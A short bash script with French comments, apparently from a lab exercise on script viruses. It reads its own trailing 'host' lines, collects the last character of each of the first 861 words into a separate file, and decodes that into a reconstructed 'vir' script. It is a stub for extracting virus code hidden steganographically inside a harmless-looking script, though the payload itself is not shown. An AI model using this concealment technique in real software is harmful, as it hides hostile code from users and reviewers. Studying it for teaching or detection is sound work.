#!/bin/bash

# on met la partie hote dans un fichier temporaire
l=$(wc -l $0|  cut -d " " -f1)
t=$(($l-40))
fichier=tp-hote.sh
tail -n $t $0 > $fichier
l=$(wc -l $fichier | cut -d" " -f1)
n=861
output1=rest-hote.sh
output2=rest-vir.sh
echo "" > $output1
echo "" > $output2
i=0
j=0
while [ $i -le $l ]
do
    ligne=$(cat $fichier | head -n $i |  tail -n 1)
    for mot in $ligne
    do        
        if [ $j -lt $n ]
        then            
            cf=$(echo -n $mot | wc -c )    
            cd=$(($cf-1))            
            echo -n "${mot:0:$cd} " >> $output1
            echo -n "${mot:$cd:1}" >> $output2            
        else
            echo -n "$mot " >> $output1
        fi
        j=$(($j+1))
    done
    echo "" >> $output1
    i=$(($i+1))
done    

cat ./rest-vir.sh | tr "#@" " \n" > rest-vir1.sh
echo "rm  rest-vir.sh rest-hote.sh tp-hote.sh"
exit 
